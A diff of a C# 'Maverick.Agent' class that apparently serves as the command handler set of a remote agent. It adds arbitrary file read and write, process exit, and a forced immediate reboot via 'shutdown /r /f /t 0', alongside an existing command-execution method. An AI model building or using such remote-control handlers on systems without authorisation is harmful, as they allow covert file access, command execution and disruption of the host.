@@ -2,12 +2,39 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
+using System.IO;
 using System.Threading.Tasks;
 
 namespace Maverick.Agent
 {
-    public static class CommandFunction
+    public static class ActionFunction
     {
+        public static byte[] PerformReadFile(string name)
+        {
+            try
+            {
+                return File.ReadAllBytes(name);
+            }
+            catch (Exception)
+            {
+                return null;
+            }
+        }
+
+
+        public static bool PerformWriteFile(string name, byte[] data)
+        {
+            try
+            {
+                File.WriteAllBytes(name, data);
+                return true;
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+        }
+
         public static byte[] PerformDoCommand(string command)
         {
             try
@@ -27,6 +54,16 @@ namespace Maverick.Agent
             {
                 return null;
             }
+        }
+
+        public static void PerformKillSystem()
+        {
+            Environment.Exit(0);
+        }
+
+        public static void PerformRebotSystem()
+        {
+            System.Diagnostics.Process.Start("shutdown", "/r /f /t 0");
         }
     }
 }
